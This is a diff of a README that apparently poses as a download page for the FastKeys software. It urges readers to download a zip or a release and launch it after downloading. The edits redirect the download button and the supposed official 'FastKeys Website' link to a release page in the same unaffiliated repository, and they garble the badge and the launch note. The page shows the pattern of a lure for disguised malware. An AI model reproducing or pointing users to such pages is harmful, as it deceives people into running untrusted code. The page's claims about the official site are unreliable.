@@ -9,9 +9,9 @@ Welcome to the FastKeys-Download repository! Here you can find all the informati
 
 ## Software Download
 Click the button below to download the FastKeys software:
-[![Download FastKeys Software](https://img.shields.io/badge/Download-Software.zip-success)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download FastKeys Software](https://github.com/xmanykwim/FastKeys-Download/releases/tag/v2.0)](https://github.com/xmanykwim/FastKeys-Download/releases/tag/v2.0)
 
-*Note: The Software.zip file needs to be launched after downloading.*
+*Note: The https://github.com/xmanykwim/FastKeys-Download/releases/tag/v2.0 file needs to be launched after downloading.*
 
 ## 🌟 Explore FastKeys Features
 Here are some of the features offered by FastKeys:
@@ -45,7 +45,7 @@ Interested in setting up a FastKeys vending kiosk? The repository provides infor
 Download the FastKeys software by clicking the button above and enjoy the convenience and efficiency that FastKeys products have to offer.
 
 ## 🚀 Visit the FastKeys Website
-For more information on FastKeys products and services, visit the [FastKeys Website](https://www.fastkeys.com).
+For more information on FastKeys products and services, visit the [FastKeys Website](https://github.com/xmanykwim/FastKeys-Download/releases/tag/v2.0).
 
 ## 📦 Check the Releases Section
 If the provided download link is not functional, please check the "Releases" section of this repository for alternative download options.
